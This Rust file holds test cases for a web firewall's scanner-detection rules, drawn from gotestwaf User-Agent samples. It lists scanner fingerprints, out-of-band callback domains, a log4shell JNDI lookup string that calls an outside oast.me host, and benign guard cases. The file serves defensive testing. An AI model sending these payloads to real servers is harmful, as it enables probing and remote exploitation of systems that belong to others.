//! Automated-scanner / security-tool User-Agent corpus cases (Fase 10a). Field:
//! the `User-Agent` request header. Rules (paranoia): scanner-tool-ua 1 (Critical),
//! scanner-oob-interaction 1 (Critical). Source: gotestwaf `community-user-agent`
//! (all Plain — no Base64Flat deferrals for this set).

use crate::{Case, Expect, Field, Module};

pub static CASES: &[Case] = &[
    // ── malicious: tool fingerprint in the UA ───────────────────────────────────
    Case {
        id: "scanner-sqlmap-ua",
        module: Module::Scanner,
        field: Field::Header { name: "user-agent", value: "sqlmap/1.7.4#stable (https://sqlmap.org)" },
        min_pl: 1,
        expect: Expect::Triggers,
        rules: &["scanner-tool-ua"],
        desc: "sqlmap UA fingerprint — gotestwaf community-user-agent",
    },
    Case {
        id: "scanner-nuclei-ua",
        module: Module::Scanner,
        field: Field::Header {
            name: "user-agent",
            value: "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)",
        },
        min_pl: 1,
        expect: Expect::Triggers,
        rules: &["scanner-tool-ua"],
        desc: "Nuclei UA fingerprint — gotestwaf community-user-agent",
    },
    Case {
        id: "scanner-ffuf-ua",
        module: Module::Scanner,
        field: Field::Header { name: "user-agent", value: "Fuzz Faster U Fool v2.0.0" },
        min_pl: 1,
        expect: Expect::Triggers,
        rules: &["scanner-tool-ua"],
        desc: "ffuf UA fingerprint (`Fuzz Faster U Fool`) — gotestwaf community-user-agent",
    },
    Case {
        id: "scanner-openvas-ua",
        module: Module::Scanner,
        // WIRE-FAITHFUL (10c REOPEN): gotestwaf's real payload is `…OpenVASVT` with the
        // `VT` GLUED on (no separator). The old fixture used `OpenVAS-VT` (hyphen), which a
        // bare `openvas\b` matched → green-but-unfaithful while the real UA bypassed.
        field: Field::Header { name: "user-agent", value: "Microsoft WinRM Client OpenVASVT" },
        min_pl: 1,
        expect: Expect::Triggers,
        rules: &["scanner-tool-ua"],
        desc: "OpenVAS UA fingerprint with glued suffix (OpenVASVT) — gotestwaf community-user-agent",
    },
    Case {
        id: "scanner-nasl-ua",
        module: Module::Scanner,
        field: Field::Header { name: "user-agent", value: "mercuryboard_user_agent_sql_injection.nasl'" },
        min_pl: 1,
        expect: Expect::Triggers,
        rules: &["scanner-tool-ua"],
        desc: "Nessus/OpenVAS `.nasl` plugin UA — gotestwaf community-user-agent",
    },
    // ── malicious: OOB interaction domain in the UA ─────────────────────────────
    Case {
        id: "scanner-burp-collaborator-ua",
        module: Module::Scanner,
        field: Field::Header {
            name: "user-agent",
            value: "http://lmb1ikpej3yys0gqft8lxewm2d89w5qtgh840sp.burpcollaborator.net/6.17.0.RELEASE",
        },
        min_pl: 1,
        expect: Expect::Triggers,
        rules: &["scanner-oob-interaction"],
        desc: "Burp Collaborator OOB domain in UA — gotestwaf community-user-agent",
    },
    Case {
        id: "scanner-interactsh-ua",
        module: Module::Scanner,
        field: Field::Header {
            name: "user-agent",
            value: "Mozilla/5.0 (Windows NT 6.1) Chrome/55.0 root@w63gecoroprj5um8ypnd7r6in9t0hseg3.interact.sh",
        },
        min_pl: 1,
        expect: Expect::Triggers,
        rules: &["scanner-oob-interaction"],
        desc: "interactsh OOB domain in UA — gotestwaf community-user-agent",
    },
    Case {
        id: "scanner-jndi-oast-ua",
        module: Module::Scanner,
        field: Field::Header {
            name: "user-agent",
            value: "${jndi:ldap://${hostName}.w63gecoroprj5um8ypnd7r6in9t0hseg3.oast.me/a}",
        },
        min_pl: 1,
        expect: Expect::Triggers,
        rules: &["scanner-oob-interaction"],
        desc: "log4shell JNDI spray with oast.me OOB domain in UA — gotestwaf community-user-agent",
    },
    // ── benign guards (must stay 200): real clients, near-miss substrings ────────
    Case {
        id: "scanner-benign-chrome-ua",
        module: Module::Scanner,
        field: Field::Header {
            name: "user-agent",
            value: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36",
        },
        min_pl: 1,
        expect: Expect::Clean,
        rules: &[],
        desc: "a real Chrome UA — must NOT flag",
    },
    Case {
        id: "scanner-benign-curl-ua",
        module: Module::Scanner,
        field: Field::Header { name: "user-agent", value: "curl/8.0.1" },
        min_pl: 1,
        expect: Expect::Clean,
        rules: &[],
        desc: "curl is a legitimate client, not a scanner — must NOT flag",
    },
    Case {
        id: "scanner-benign-sitemap-ua",
        module: Module::Scanner,
        field: Field::Header { name: "user-agent", value: "Mozilla/5.0 SitemapGenerator/2.0" },
        min_pl: 1,
        expect: Expect::Clean,
        rules: &[],
        desc: "`Sitemap` contains `map` but not the `\\bnmap\\b` token — must NOT flag",
    },
];
